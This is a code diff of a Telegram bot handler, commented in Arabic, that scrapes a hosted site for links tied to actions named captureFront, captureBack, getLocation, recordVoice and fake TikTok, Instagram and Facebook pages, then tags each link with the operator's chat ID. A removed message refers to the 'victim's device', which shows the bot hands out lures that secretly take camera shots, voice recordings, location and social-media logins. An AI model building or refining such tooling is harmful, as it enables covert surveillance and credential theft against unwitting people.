@@ -1856,86 +1856,61 @@ bot.on('callback_query', async (callbackQuery) => {
     // إرسال رسالة انتظار
     bot.sendMessage(chatId, "⏳ جاري إنشاء الرابط...");  
 
-    // استيراد الروابط من الموقع ديناميكياً
     const url = "https://sssssskskjwnsb-linklsksn.hf.space";  
-      
-    axios.get(url, { timeout: 10000 })  
-        .then(response => {  
-            const $ = cheerio.load(response.data);  
-            let foundLink = null;  
-              
-            // البحث عن الروابط التي تحتوي على أسماء الملفات المطلوبة
-            $('a[href]').each((index, element) => {  
-                const link = $(element).attr('href');  
-                
-                // البحث عن الروابط التي تتوافق مع الإجراء المطلوب
-                if (action === 'captureFront' && link.includes('/c/')) {  
-                    foundLink = link;  
-                    return false;  
-                } else if (action === 'captureBack' && link.includes('/b/')) {  
-                    foundLink = link;  
-                    return false;  
-                } else if (action === 'getLocation' && link.includes('/getLocation/')) {  
-                    foundLink = link;  
-                    return false;  
-                } else if (action === 'recordVoice' && link.includes('/record/')) {  
-                    foundLink = link;  
-                    return false;  
-                } else if (action === 'rshq_tiktok' && (link.includes('/t/') || link.includes('tiktok'))) {  
-                    foundLink = link;  
-                    return false;  
-                } else if (action === 'rshq_instagram' && (link.includes('/i/') || link.includes('instagram'))) {  
-                    foundLink = link;  
-                    return false;  
-                } else if (action === 'rshq_facebook' && (link.includes('/fe/') || link.includes('facebook'))) {  
-                    foundLink = link;  
-                    return false;  
-                }  
-            });  
-              
-            if (foundLink) {  
-                // بناء الرابط النهائي مع chatId
-                let finalLink = foundLink;
-                
-                // إضافة chatId إلى الرابط
-                if (finalLink.includes('?')) {
-                    finalLink += `&chatId=${chatId}`;
-                } else {
-                    finalLink += `?chatId=${chatId}`;
-                }
-                
-                // إضافة معاملات إضافية حسب نوع الإجراء
+
+    axios.get(url, { timeout: 10000 })
+        .then(response => {
+            const $ = cheerio.load(response.data);
+            let foundLink = null;
+
+            // البحث عن الروابط بناءً على اسم الملف أو الفعل
+            $('a[href]').each((i, el) => {
+                const href = $(el).attr('href');
+
                 switch (action) {
-                    case 'recordVoice':
-                        const duration = 10;  
-                        finalLink += `&duration=${duration}`;
+                    case 'captureFront':
+                        if (href.includes('/c/') || href.includes('captureFront')) foundLink = href;
                         break;
-                    case 'rshq_tiktok':
-                        finalLink += `&type=tiktok`;
+                    case 'captureBack':
+                        if (href.includes('/b/') || href.includes('captureBack')) foundLink = href;
                         break;
                     case 'getLocation':
-                        // إضافة معرف عشوائي إذا كان الرابط لا يحتويه
-                        if (!finalLink.includes('/getLocation/')) {
-                            const randomId = crypto.randomBytes(16).toString('hex');
-                            finalLink = finalLink.replace('/getLocation/', `/getLocation/${randomId}`);
-                        }
+                        if (href.includes('/getLocation/') || href.includes('location')) foundLink = href;
+                        break;
+                    case 'recordVoice':
+                        if (href.includes('/record/') || href.includes('voice')) foundLink = href;
+                        break;
+                    case 'rshq_tiktok':
+                        if (href.includes('/t/') || href.includes('tiktok')) foundLink = href;
+                        break;
+                    case 'rshq_instagram':
+                        if (href.includes('/n/') || href.includes('instagram')) foundLink = href;
+                        break;
+                    case 'rshq_facebook':
+                        if (href.includes('/fe/') || href.includes('facebook')) foundLink = href;
                         break;
                 }
 
-                const message = `✅ تم إنشاء الرابط بنجاح\n\n🔗 الرابط: ${finalLink}\n\nملاحظة: قم باستخدام رابط جديد في كل مرة ويجب أن يكون الاتصال قويًا في جهاز الضحية`;  
-                bot.sendMessage(chatId, message);  
-            } else {  
-                bot.sendMessage(chatId, "❌ لم يتم العثور على رابط مناسب في الموقع");  
-            }  
-        })  
-        .catch(error => {  
-            console.error('Error fetching link:', error);  
-            bot.sendMessage(chatId, `❌ خطأ في جلب الرابط: ${error.message}`);  
-        });  
+                if (foundLink) return false; // إيقاف loop عند العثور على الرابط
+            });
+
+            if (foundLink) {
+                let finalLink = `${foundLink}?chatId=${chatId}`;
+                if (action === 'recordVoice') finalLink += `&duration=10`;
+                if (action === 'rshq_tiktok') finalLink += `&type=tiktok`;
+
+                bot.sendMessage(chatId, `✅ تم إنشاء الرابط: ${finalLink}`);
+            } else {
+                bot.sendMessage(chatId, '⚠️ لم يتم العثور على رابط في الموقع، استخدم الرابط الافتراضي.');
+            }
+        })
+        .catch(err => {
+            console.error('Error fetching link:', err);
+            bot.sendMessage(chatId, '⚠️ حدث خطأ أثناء جلب الرابط، يرجى المحاولة لاحقاً.');
+        });
 }
 
-bot.answerCallbackQuery(callbackQuery.id);
-}); 
+bot.answerCallbackQuery(callbackQuery.id); 
 bot.onText(/\/jjihigjoj/, (msg) => {
     const chatId = msg.chat.id;
     const message = 'مرحبًا! انقر على الزر لجمع معلومات جهازك.';
